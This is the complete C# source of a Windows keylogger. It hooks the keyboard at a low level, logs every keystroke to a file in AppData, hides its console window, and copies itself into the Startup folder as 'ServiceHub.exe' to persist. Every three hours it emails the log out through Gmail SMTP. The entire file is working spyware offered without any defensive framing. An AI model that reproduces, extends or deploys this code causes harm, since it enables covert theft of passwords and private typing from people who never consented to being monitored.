using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

class InterceptKeys
{
    private static readonly int SENDINTERVAL = 10800000; // 3 hours
    private static readonly string LOGFILENAME = $@"C:\Users\{Environment.UserName}\AppData\Local\log.txt";
    private static readonly string STARTUPFILENAME = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ServiceHub.exe";

    private static readonly string CURRENTFILENAME = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;


    private static string emailFrom = "EmailFrom@gmail.com";
    private static string emailTo = "EmailTo@gmail.com";
    private static string password = "YourPassword";


    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    static readonly object _locker = new object();

    public static void Main(string[] args)
    {
        AddToStartUp();
        new Thread(SendEmail).Start();
        var handle = GetConsoleWindow();

#if DEBUG
#else
        // Hide console window on production
        ShowWindow(handle, SW_HIDE);
#endif

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    public static void AddToStartUp()
    {
        try
        {
            Console.WriteLine(CURRENTFILENAME);
            Console.WriteLine(STARTUPFILENAME);

            if (CURRENTFILENAME != STARTUPFILENAME)
            {
                Console.WriteLine("Adding to StartUp Folder");
                File.Copy(CURRENTFILENAME, STARTUPFILENAME, true);
            }
            else
            {
                Console.WriteLine("File run from startup");
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
        }
    }

    public static void SendEmail()
    {
        while (true)
        {
            try
            {
                lock (_locker)
                {
                    using (var sw = new StreamWriter(LOGFILENAME, true))
                    {
                        sw.WriteLine($"{DateTime.Now}");
                    }
                }

                Console.WriteLine("Sending email");
                var smtpClient = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    Credentials = new NetworkCredential(emailFrom, password),
                    EnableSsl = true,
                };

                string fileContent;
                lock (_locker)
                {
                    using (var sr = new StreamReader(LOGFILENAME))
                    {
                        fileContent = sr.ReadToEnd();
                    }
                }
                
                smtpClient.Send(emailFrom, emailTo, "subject", fileContent);
                Console.WriteLine("Email sent");

                lock (_locker)
                {
                    using (var sw = new StreamWriter(LOGFILENAME))
                    {
                        sw.WriteLine($"{DateTime.Now}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            Thread.Sleep(SENDINTERVAL);
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);


    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            try
            {
                lock (_locker)
                {
                    using (var sw = new StreamWriter(LOGFILENAME, true))
                    {
                        sw.Write((Keys) vkCode + " ");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}

